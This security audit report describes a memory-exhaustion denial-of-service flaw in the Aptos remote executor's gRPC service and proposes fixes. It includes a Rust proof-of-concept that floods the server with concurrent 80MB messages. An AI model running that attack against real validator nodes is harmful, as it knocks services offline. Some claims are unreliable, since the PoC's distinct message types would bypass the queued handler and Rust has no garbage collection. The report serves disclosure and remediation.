# Audit Report

## Title
Memory Exhaustion Attack via Concurrent 80MB gRPC Messages in Remote Executor Service

## Summary
The remote executor service's gRPC server accepts messages up to 80MB without enforcing any concurrency limits or backpressure mechanisms. Attackers can send multiple concurrent 80MB messages that accumulate in unbounded channels, leading to memory exhaustion and validator node crashes.

## Finding Description

The vulnerability exists in the remote executor service's gRPC message handling implementation. The service accepts network messages with a maximum size of 80MB: [1](#0-0) 

When the gRPC server is configured, it only sets a timeout but does not limit concurrent streams or connection-level resources: [2](#0-1) 

When messages arrive, they are deserialized into `Vec<u8>` buffers and sent to handlers via unbounded crossbeam channels: [3](#0-2) 

The NetworkController creates these channels as unbounded: [4](#0-3) 

The Message struct simply wraps a `Vec<u8>`: [5](#0-4) 

**Attack Sequence:**
1. Attacker establishes multiple concurrent HTTP/2 connections (or uses stream multiplexing on a single connection)
2. Sends N concurrent 80MB gRPC messages to the remote executor service
3. Each message allocates ~80MB in a `Vec<u8>` buffer
4. Messages are placed in unbounded channels via `handler.send(msg).unwrap()`
5. If message processing is slower than arrival rate, messages accumulate
6. Total memory consumption: N × 80MB + overhead
7. With 100 concurrent messages: ~8GB memory exhaustion
8. With 1000 concurrent messages: ~80GB memory exhaustion
9. System runs out of memory → OOM killer terminates validator process

**Broken Invariant:**
This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The system fails to enforce memory limits on incoming network messages.

## Impact Explanation

**Severity: Critical** (per Aptos Bug Bounty criteria)

This vulnerability falls under two critical impact categories:

1. **"Total loss of liveness/network availability"**: A coordinated attack sending concurrent large messages to multiple validator nodes can crash them simultaneously, causing network-wide liveness failure.

2. **"Validator node slowdowns"** (High severity minimum): Even before complete crashes, memory pressure causes severe performance degradation, garbage collection pauses, and delayed block processing.

Additional impacts:
- Remote executor service is used for sharded execution, critical for throughput
- Crashed validators cannot participate in consensus
- Recovery requires node restart, causing extended downtime
- No authentication required - any network peer can exploit this
- Attack is repeatable and can prevent nodes from staying online

## Likelihood Explanation

**Likelihood: High**

The attack is highly likely to succeed because:

1. **Low Attack Complexity**: Requires only basic gRPC client capabilities and network access
2. **No Authentication**: The gRPC service has no visible authentication or peer validation
3. **No Rate Limiting**: Neither the gRPC layer nor application layer implements rate limiting
4. **Deterministic Behavior**: Unbounded channels guarantee memory accumulation under load
5. **Default HTTP/2 Configuration**: Without `max_concurrent_streams()`, servers typically allow 100+ concurrent streams per connection
6. **Multiple Attack Vectors**: Attacker can use multiple connections, stream multiplexing, or both

**Attacker Requirements:**
- Network connectivity to validator nodes
- Basic gRPC client library
- Ability to generate 80MB payloads (trivial - can be random data)
- No insider access or validator credentials needed

## Recommendation

Implement multiple layers of defense:

**1. Set HTTP/2 Concurrent Stream Limits:**
```rust
// In secure/net/src/grpc_network_service/mod.rs
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .max_concurrent_streams(Some(10))  // Limit concurrent streams
    .http2_initial_connection_window_size(Some(1024 * 1024))  // 1MB
    .add_service(
        NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
    )
    // ... rest of configuration
```

**2. Replace Unbounded Channels with Bounded Channels:**
```rust
// In secure/net/src/network_controller/mod.rs
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel instead of unbounded
    let (inbound_sender, inbound_receiver) = bounded(100);  // Limit to 100 pending messages
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

**3. Add Backpressure Handling:**
```rust
// In secure/net/src/grpc_network_service/mod.rs
if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
    // Use try_send instead of send to detect channel full
    match handler.try_send(msg) {
        Ok(_) => {},
        Err(_) => {
            return Err(Status::resource_exhausted(
                "Message queue full - server overloaded"
            ));
        }
    }
}
```

**4. Add Per-Peer Rate Limiting:**
Implement token bucket rate limiting per source IP/peer to prevent a single attacker from monopolizing resources.

**5. Reduce MAX_MESSAGE_SIZE:**
Consider whether 80MB is necessary. If smaller messages suffice, reduce the limit to decrease attack impact.

## Proof of Concept

```rust
// Proof of Concept - Rust test demonstrating memory exhaustion
use tokio::runtime::Runtime;
use std::net::SocketAddr;
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient, NetworkMessage,
};

#[tokio::test]
async fn test_memory_exhaustion_attack() {
    // Setup: Start remote executor service on localhost
    let server_addr: SocketAddr = "127.0.0.1:50051".parse().unwrap();
    
    // Attack: Send 100 concurrent 80MB messages
    let num_concurrent_messages = 100;
    let message_size = 80 * 1024 * 1024; // 80MB
    
    let mut handles = vec![];
    
    for i in 0..num_concurrent_messages {
        let addr = format!("http://{}", server_addr);
        let handle = tokio::spawn(async move {
            let mut client = NetworkMessageServiceClient::connect(addr)
                .await
                .unwrap();
            
            // Create 80MB message
            let large_payload = vec![0u8; message_size];
            let request = tonic::Request::new(NetworkMessage {
                message: large_payload,
                message_type: format!("attack_type_{}", i),
            });
            
            // Send message - will queue in unbounded channel
            client.simple_msg_exchange(request).await
        });
        
        handles.push(handle);
    }
    
    // Wait for all messages to be sent
    for handle in handles {
        let _ = handle.await;
    }
    
    // Expected result: Server memory usage increases by ~8GB
    // Actual result: Server likely crashes with OOM if system has < 8GB available
    println!("Attack complete - check server memory usage");
}
```

**To reproduce:**
1. Start a remote executor service node
2. Run the PoC test from an attacker machine
3. Monitor server memory with `top` or similar
4. Observe memory consumption increasing by ~8GB (100 × 80MB)
5. If available memory < 8GB, observe OOM killer terminating the process

**Notes**

This vulnerability is particularly severe for the remote executor service because:

1. **Sharded Execution Dependency**: The remote executor service is critical for Aptos's sharded block execution feature, making this a high-value target.

2. **No Authentication**: The gRPC service appears to lack authentication, allowing any network peer to exploit this.

3. **Cascading Failures**: Memory exhaustion can cause garbage collection storms that slow down all components, not just the executor service.

4. **Persistence**: Even after one attack, subsequent attacks can be launched immediately, preventing node recovery.

The combination of 80MB message size, unbounded channels, no concurrency limits, and no rate limiting creates a perfect storm for memory exhaustion attacks. This requires immediate remediation before deployment to production environments.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L56-70)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
#[allow(dead_code)]
pub struct Message {
    pub data: Vec<u8>,
}

impl Message {
    pub fn new(data: Vec<u8>) -> Self {
        Self { data }
    }

    pub fn to_bytes(self) -> Vec<u8> {
        self.data
    }
}
```

**File:** secure/net/src/network_controller/mod.rs (L115-136)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }

    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
```
